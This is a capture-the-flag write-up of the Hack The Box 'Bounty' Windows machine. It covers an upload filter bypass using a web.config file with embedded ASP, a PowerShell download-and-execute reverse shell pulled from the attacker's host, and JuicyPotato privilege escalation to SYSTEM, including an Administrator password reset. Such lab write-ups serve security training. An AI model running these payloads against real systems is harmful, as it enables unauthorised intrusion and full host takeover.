---
layout: single
title: Bounty - Hack The Box
excerpt: "Bounty is an easy difficulty Windows machine, which features an interesting techniques to bypass file uploader protections and achieve code execution. Privileges escalation invloves abusing SeImpersonatePrivilege. This machine is also vulnerable to multiple privilege escalation vulnerabilites. Which highlights the importance of keeping system upto date with latest security patches."
date: 2020-04-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-bounty/bounty_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - OSCP
  - IIS
  - RCE
  - File Upload
  - JuicyPotato
---

![](/assets/images/htb-writeup-bounty/bounty_logo.png)

## Synopsis
Bounty is an easy difficulty Windows machine, which features an interesting techniques to bypass `file uploader` protections and achieve `code execution`. Privileges escalation invloves abusing `SeImpersonatePrivilege`. This machine is also vulnerable to multiple privilege escalation vulnerabilites. Which highlights the importance of keeping system upto date with latest security patches.

## Skills Required
Basics of C# or VB.NET

## Skills Learned
* web.config payload creation
* Identifying missing security patches

---
## Enumeration
### Nmap
As always we start with nmap.
```java
# Nmap 7.80 scan initiated Sat Apr 18 02:47:28 2020 as: nmap -Pn -sC -sV -v -p80 -oN full.nmap bounty.htb
Nmap scan report for bounty.htb (10.10.10.93)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
We only see port `80` open and its running `IIS 7.5`. Little googling about the `IIS version`. we know that it is `Built-in component of Windows 7 and Windows Server 2008 R2`.

### IIS
Navigate to the page on port `80` we're presetend a page with image.

![](/assets/images/htb-writeup-bounty/merlin.png)

Since main page doesn't take us to anywhere. we'll perform `gobuster` to find for the hidden directories or files. Since this is running `IIS` i'l append `asp,aspx` extenstions to `gobuster`.
```
gobuster dir -u http://10.10.10.93/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x asp,aspx -o dir.log

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.93/
[+] Threads:        50
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     asp,aspx
[+] Timeout:        10s
===============================================================
2020/04/19 11:11:58 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
/transfer.aspx (Status: 200)
/uploadedfiles (Status: 301)
```

We found two directories and an `transfer.aspx` file. let's look at them.

Navigating to `/transfer.aspx` its gives some file upload page.

![](/assets/images/htb-writeup-bounty/upload.png)

At First go i've tried uploading an image and it wokred and relating it `/uploadedfiles` directory . we're able to access `uploaded` files at `/uploadefiles` endpoint. which is good.

![](/assets/images/htb-writeup-bounty/access.png)

So, looking at this behaviour i've tried uploading a `aspx` file. but It's throwing me an error and unable to upload It. I've tried bypassing extension with `%00` null byte in the post request. but i'm unable to access the uploade `aspx` file at `/uploadedfiles`.

![](/assets/images/htb-writeup-bounty/null.png)

So, we'll `Fuzz` the upload functionality and check what kinda `extensions` it accepts. So, i've create a `extesnions.list` with common extensions in it.
```
cat extensions.list 

asp
aspx
php
php5
php7
phtml
pl
exe
config
gif
png
jpg
```
To automate this process of extension checking on the `File` upload i've written a python script. This to work properly we need value of `__VIEWSTATE` and `__EVENTVALIDATION` which we can grab from the source of the `File upload` page. The `extensionCheck.py` python script looks like this.
```python
import requests
import re

def FileUpload(filename):
    url = "http://10.10.10.93/transfer.aspx"
    burp = {'http' : 'http://127.0.0.1:8080'}

    session = requests.session()
    request = session.get(url)

    ViewState = re.findall(r'__VIEWSTATE" value="(.*?)"', request.text)[0]
    EventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"',request.text)[0]

    post_data = {
        '__VIEWSTATE' : ViewState,
        '__EVENTVALIDATION' : EventValidation,
        'btnUpload' : 'upload'
    } 

    uploaded_file = {'FileUpload1' : (filename, 'test file')}

    request = session.post(url,files=uploaded_file, data=post_data, proxies=burp)
    return request.text
print("Allowed Extensions:")    
for extension in open('extensions.list','r'):
        response = FileUpload('mah1ndra.' + extension[:-1])
        if "Invalid File" not in response:
            print(extension)
```
Running the python script gives us the allowed file extensions on the machine. 
```
python3 extensionCheck.py 

Allowed Extensions: 
config
gif
png
jpg
```

### web.config RCE
Looking at the allowed extension. `config` seems to be interesting . quick googling for `aspx config file upload rce`. I came across this awesome blog [Upload a web.config File for Fun & Profit](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/). Which tell in `IIS 7.5` we can upload `web.config` file with `asp` code inside it and achieve `RCE`.

This blog also gives us sample `web.config` file.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```
In the ASP `comment` it is telling us after uploding this `web.config` on the vunlerable `IIS` Website and if it gives `3` as ouput. Then we it is confirmed that its running the `ASP code`.

Uploading this `web.config` file and looking at it on `/uploadedfiles/web.config` gives us output `3`.

![](/assets/images/htb-writeup-bounty/3.png)

So, We confirmed that its running `asp` code. now we'll append a simple `asp` code and execute `ping` command and see if machine is doing a ping to our `IP`.
```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c ping 10.10.14.24")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```
```
curl http://10.10.10.93/uploadedfiles/web.config 
```
![](/assets/images/htb-writeup-bounty/ping.png)

We're getting `ping's` fromt the bounty machine ip and we confirmed the `code exection`. Now we use `Nishangs` Powershell scripts to get a `reverse shell`. we'll insert the following commnand.
```
cmd /c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24/Invoke-PowerShellTcp.ps1')
```
![](/assets/images/htb-writeup-bounty/shell.png)

Now, we got a shell as `merlin` user.

## Privilege Escalation
Doing `system info` we'll know this box is vulnerable to lots of privilege escalations` .Since its a `Windowns Server 2008 R2` no `Hotfixes` installed.
```
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          4/19/2020, 10:17:28 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,575 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,577 MB
Virtual Memory: In Use:    518 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

Also looking at `privileges` of `merlin` user we can see that `SeImpersonatePrivilege` enabled. We can use `JuciyPotato` to exploit this.
```
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`Juicy potato` can make use of other `COM` server and any port other than `6666`. we can download `JuicyPotato.exe` from releases.
```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

we'll create a `rev.bat` script which execute powershell `Invoke TCP` and give us reverse shell. 
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24/Invoke-PowerShellTcp.ps1')"
```

Similary, we can create a script(pwned.bat) to change the `Administrator` passowrd and login with `PSEXEC` with those credentials
```
net user Administrator pwned
```

we need to transfer both `rev.bat` and `JuicyPotato.exe` on to the machine . Then we need valid `CLSID` to exploit it. There a list of [CLSID for Windows Server 2008 R2](http://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/) and we can choose one which gives `NT AUTHORITY\SYSTEM`.

Now we'll run the binary with required arguments.
```
PS C:\temp> ./JuicyPotato.exe -t * -p c:\temp\rev.bat -l 9001 -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}'
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 9001
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

This give us reverse shell as `NT AUTHORITY\SYSTEM`.
```
sudo rlwrap ncat -lvnp 443

Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.93.
Ncat: Connection from 10.10.10.93:49174.
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
bounty
```
Thank you for taking your time for reading this blog!.


